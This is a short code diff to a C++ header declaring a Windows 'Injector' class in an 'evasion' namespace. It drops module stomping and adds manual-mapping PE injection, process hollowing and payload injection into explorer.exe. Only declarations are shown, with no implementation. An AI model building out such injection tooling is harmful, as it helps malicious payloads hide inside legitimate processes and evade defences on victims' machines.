@@ -2,16 +2,23 @@
 #include <windows.h>
 #include <vector>
 #include <cstdint>
+#include <string>
 
 namespace evasion {
 
 class Injector {
 public:
-    // Process Hollowing
-    static bool HollowProcess(const char* targetPath, const std::vector<uint8_t>& payload);
+    // Manual Mapping / PE Injection
+    static bool MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload);
 
-    // Module Stomping
-    static bool ModuleStomping(DWORD processId, const char* moduleName, const std::vector<uint8_t>& payload);
+    // Process Hollowing (uses MapAndInject)
+    static bool HollowProcess(const std::wstring& targetPath, const std::vector<uint8_t>& payload);
+
+    // Get Process ID by name
+    static DWORD GetProcessIdByName(const std::wstring& processName);
+
+    // Robust injection into explorer.exe
+    static bool InjectIntoExplorer(const std::vector<uint8_t>& payload);
 };
 
 } // namespace evasion
